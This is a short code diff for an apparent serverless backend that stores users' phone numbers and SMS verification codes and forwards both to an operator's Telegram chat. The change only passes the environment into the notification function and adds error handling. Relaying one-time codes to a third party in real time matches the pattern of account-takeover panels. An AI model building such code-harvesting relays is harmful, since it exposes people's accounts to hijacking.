@@ -41,7 +41,7 @@ export async function register(request, { env }) {
 
     await env.PHONE_KV.put(phone, JSON.stringify({ status: 1, phone: { number: phone } }));
 
-    await sendTelegramNotification(`手机号：${phone}申请注册,请处理。`);
+    await sendTelegramNotification(`手机号：${phone}申请注册,请处理。`, env);
 
     return new Response(JSON.stringify({ message: '注册申请已提交' }), { status: 200 });
 }
@@ -51,7 +51,7 @@ export async function submitCode(request, { env }) {
 
     await env.PHONE_KV.put(phone, JSON.stringify({ status: 2, phone: { number: phone, code } }));
 
-    await sendTelegramNotification(`正在注册,手机号：${phone},验证码：${code}`);
+    await sendTelegramNotification(`正在注册,手机号：${phone},验证码：${code}`, env);
 
     return new Response(JSON.stringify({ message: '验证码已提交' }), { status: 200 });
 }
@@ -88,20 +88,24 @@ export async function updateAdminStatus(request, { env }) {
     return new Response(JSON.stringify({ message: '未找到该手机号记录' }), { status: 404 });
 }
 
-async function sendTelegramNotification(message) {
+async function sendTelegramNotification(message, env) {
     const url = `https://api.telegram.org/bot${env.TG_BOT_TOKEN}/sendMessage`;
-    const response = await fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            chat_id: TG_CHAT_ID,
-            text: message,
-        }),
-    });
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: env.TG_CHAT_ID,
+                text: message,
+            }),
+        });
 
-    if (!response.ok) {
-        console.error('Failed to send Telegram notification');
+        if (!response.ok) {
+            console.error('Failed to send Telegram notification', await response.text());
+        }
+    } catch (error) {
+        console.error('Error sending Telegram notification:', error);
     }
 }
